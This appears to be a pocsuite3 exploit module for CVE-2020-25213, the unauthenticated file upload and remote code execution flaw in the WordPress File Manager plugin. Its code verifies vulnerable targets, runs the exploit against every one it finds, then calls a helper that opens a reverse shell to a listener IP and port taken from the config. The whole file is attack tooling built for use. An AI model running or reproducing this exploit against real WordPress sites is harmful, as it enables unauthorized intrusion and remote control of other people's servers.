"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse

from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2020_25213 import elFinder_rce


class DemoPOC(POCBase):
    vulID = 'CVE-2020-25213'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '13/03/2020'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://wpscan.com/vulnerability/10389']
    name = 'WordPress - File Manager < 6.9 - Unauthenticated Arbitrary File Upload leading to RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
                "folder_init": "cve_2020_25213"}
    appName = 'wordpress-cve-2020-25213'
    appVersion = 'CVE-2020-25213'
    vulType = VUL_TYPE.UPLOAD_FILES
    desc = '''File lib/php/connector.minimal.php can be default opened directly, and this file load lib/php/elFinderConnector.class.php which read POST/GET variables, and then allow executing some internal feature, like uploading file. PHP is allowed, thus this lead to unauthenticated arbitrary file upload and remote code execution. '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}


    def _verify(self, update=True):
        if update: 
            config_input,Referer = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e))
        result = {}
        self.result_url = []
        for url in self.url: 
            if elFinder_rce.verify(url): 
                self.result_url.append(url)
        if len(self.result_url) > 0 : 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.result_url
            result['VerifyInfo']['verify_url'] = "wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        if update: 
            return self.parse_output(result)
        else: 
            return result
       

    def _attack(self):
        config_input, Referer = decode_data_input_poc(self.headers['Referer'])
        try: 
            self.url = config_input["Input"]['RECON_WEBAPP']
        except Exception as e: 
            raise Exception("Error " + self.appName + " :" + str(e) )
        result = {}
        vul_url = []
        if len(self._verify(update=False)) > 0: 
            for url in self.url: 
                if elFinder_rce.exploit(url): 
                    vul_url.append(url)
            print(vul_url)
            if len(vul_url) > 0: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  vul_url
                result['ShellInfo']['info'] = '''wordpress file manager plugin RCE ''' 
                return self.parse_output(result)
            else: 
                return self.parse_output(False)
        else: 
            return self.parse_output(False)

    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            elFinder_rce.rce(self.url, lhost_running, lport_running)
            result['ShellInfo']["url"] = self.url
            result['ShellInfo']["info_reverse_shell"] = {
                "PublicIP": lhost_running,
                "PublicPort": lport_running

            }
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)
        
                 
   

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
